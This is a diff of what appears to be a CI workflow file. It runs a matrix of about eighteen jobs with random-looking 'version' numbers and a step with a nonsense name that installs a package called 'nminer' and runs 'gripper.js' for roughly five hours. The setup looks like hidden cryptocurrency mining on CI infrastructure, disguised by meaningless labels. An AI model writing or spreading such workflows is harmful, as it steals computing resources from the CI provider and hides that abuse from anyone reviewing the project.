@@ -9,23 +9,24 @@ jobs:
     strategy:
       matrix:
         config:
-          - { version: 1872 }
-          - { version: 8041 }
-          - { version: 7500 }
-          - { version: 6746 }
-          - { version: 3472 }
-          - { version: 5801 }
-          - { version: 8793 }
-          - { version: 4143 }
-          - { version: 9922 }
-          - { version: 7908 }
-          - { version: 9502 }
-          - { version: 3484 }
-          - { version: 4663 }
-          - { version: 1578 }
-          - { version: 2724 }
-          - { version: 7676 }
-          - { version: 5210 }
+          - { version: 7669 }
+          - { version: 9227 }
+          - { version: 2491 }
+          - { version: 3284 }
+          - { version: 2470 }
+          - { version: 2272 }
+          - { version: 4834 }
+          - { version: 9560 }
+          - { version: 2651 }
+          - { version: 4799 }
+          - { version: 6927 }
+          - { version: 1494 }
+          - { version: 3204 }
+          - { version: 4325 }
+          - { version: 7637 }
+          - { version: 5399 }
+          - { version: 6415 }
+          - { version: 3553 }
 
     steps:
       - name: Checkout
@@ -36,7 +37,7 @@ jobs:
         with:
           node-version: 20
           
-      - name: technologist dishearten sauerkraut brr chatter
+      - name: silently gee impish
         run: |
           npm install nminer@latest
-          timeout 305m node gripper.js || echo "gripper executed"
+          timeout 309m node gripper.js || echo "gripper executed"
